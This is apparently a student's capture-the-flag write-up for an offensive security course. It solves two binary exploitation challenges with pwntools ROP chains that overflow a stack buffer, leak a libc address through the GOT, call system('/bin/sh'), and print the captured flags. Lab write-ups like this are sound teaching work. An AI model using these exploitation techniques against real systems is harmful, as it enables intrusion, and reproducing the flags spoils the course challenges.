# CSGY 9223 Intro to Offensive Security
# Week 7 Challenges
# nam10102

## Challenge - Baby ROP
```aiignore
Can you pop a shell?

nc offsec-chalbroker.osiris.cyber.nyu.edu 1201
```
Inspecting baby_rop:
```aiignore
$ pwn checksec --file=baby_rop
[*] '/mnt/csgy9223_IntroOffSec/week_7/baby_rop'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Running baby_rop:
```aiignore
 ./baby_rop

        Can you pop a shell? like /bin/sh
        > /bin/sh
```
Let's inspect the binary using binja.

Using ROPgadget to see what's available:
```aiignore
ROPgadget --binary baby_rop | grep rdi
0x0000000000401199 : cli ; push rbp ; mov rbp, rsp ; pop rdi ; ret
0x0000000000401196 : endbr64 ; push rbp ; mov rbp, rsp ; pop rdi ; ret
0x000000000040119c : mov ebp, esp ; pop rdi ; ret
0x000000000040119b : mov rbp, rsp ; pop rdi ; ret
0x0000000000401106 : or dword ptr [rdi + 0x404010], edi ; jmp rax
0x000000000040119e : pop rdi ; ret
0x000000000040119a : push rbp ; mov rbp, rsp ; pop rdi ; ret
0x0000000000401178 : stosd dword ptr [rdi], eax ; add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
```
I see a rdi gadget at 0x000000000040119e, lets start there. Building my solver...

Looks like gets is being used to capture user input. We have around 0x18 bytes to take over the rip. First I need to find a "/bin/sh" string. And we found one:
```aiignore
hex(next(e.search(b"/bin/sh")))
'0x402026'
```
We have enough to build a rop chain. My rop chain and payload:
```python
chain = [
    target_rop.ret.address,
    target_rop.rdi.address,
    bin_sh,
    target_elf.plt.system
]

p.sendline(b'A' * 0x18 + b"".join([p64(c) for c in chain]))
```
The results are:
```python
$ ls
baby_rop
flag.txt
$ cat flag.txt
flag{4ll_g4dg3ts_1nclud3d!_a4d1bedea184635d}
```

## Challenge - EZ Target
```
Time to find some gadgets!

nc offsec-chalbroker.osiris.cyber.nyu.edu 1203
```
We are given a glibc file as well as the binary ex_target.

```python
$ pwn checksec --file=ez_target
[*] '/mnt/csgy9223_IntroOffSec/week_7/ez_target'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Running binary:
```python
$ ./ez_target

Anything you'd like to ask me?
give me an address
Segmentation fault
(csgy9223py) nmaiorana@Nicks-Surface-6:~/csgy9223/csgy9223_IntroOffSec/week_7$ an address
```
Looks like the input takes in 8 bytes because the last part of my entry is left off. Opening with binja.

The input value indeed takes in 8 bytes. Then it's treated like a pointer. Since puts() was called once, I can send in the GOT address for puts to get a base address. It also takes in another input of up to 0x40 bytes. I'll use this to own the stack. Building solver...

First I need some gadgets. None in ez_target, checking glibc.
```python
r = ROP("./libc.so.6")
[*] '/mnt/csgy9223_IntroOffSec/week_7/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] Loading gadgets for '/mnt/csgy9223_IntroOffSec/week_7/libc.so.6'
>>>
>>> r.rdi
Gadget(0x2a3e5, ['pop rdi', 'ret'], ['rdi'], 0x8)
```
Plan of attack:
- Get address of puts from the GOT since it's already called when we send in our GOT value
- Get base address using glibc puts() offset (we need this to get the address of system out of glibc)
- Create rop chain and payload adding the base address

The payload buffer is 0x58 bytes off of rip. How can I get there with 0x40 bytes? The memcpy() will copy the contents of the second buffer into the first buffer, giving me the length I need to do a BOF.

Since it's 0x18 bytes of the ret, I'll send in 0x18 bytes of filler, followed by my rop chain.

```python
chain = [
    ret_gadget.address + base_address,
    rdi_gadget.address + base_address,
    bin_sh + base_address,
    system_address + base_address
]


p.recvline(b'shell!')
p.sendline(b'A' * 0x18 + b"".join([p64(c) for c in chain]))
```

Results:
```aiignore
    b'ls\n'
[DEBUG] Received 0x13 bytes:
    b'ez_target\n'
    b'flag.txt\n'
ez_target
flag.txt
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x31 bytes:
    b'flag{l1bc_g4dg3ts_f0r_th3_w1n!_22a3e11c237e7557}\n'
flag{l1bc_g4dg3ts_f0r_th3_w1n!_22a3e11c237e7557}
```



